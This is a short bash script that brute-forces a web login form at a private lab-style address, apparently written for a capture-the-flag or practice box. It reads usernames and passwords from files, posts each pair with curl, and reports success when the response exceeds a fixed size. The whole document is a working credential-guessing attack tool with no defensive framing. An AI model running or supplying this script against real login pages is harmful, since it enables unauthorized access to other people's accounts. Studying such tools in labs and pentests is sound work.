#!/usr/bin/env bash

# Brute force log in 
# - Uses password.txt file
# - Uses usernames.txt file

url='http://10.10.10.10/login'
i=1
failed_request_size=4179

while IFS='' read username
do
    l=$i"p"
    password=$(sed -n "$l" ./passwords.txt)
    response=$(curl -s -L -d "username=$username" -d "password=$password" --cookie cookie.txt "$url")
    size=${#response}
    ((i=i+1))

    # Success if request is larger than failed_request_size
    if [[ $size -gt $failed_request_size ]]
    then
        echo -e "\033[0;32mSUCCESS:\033[0m $username:$password"
    fi
done < usernames.txt
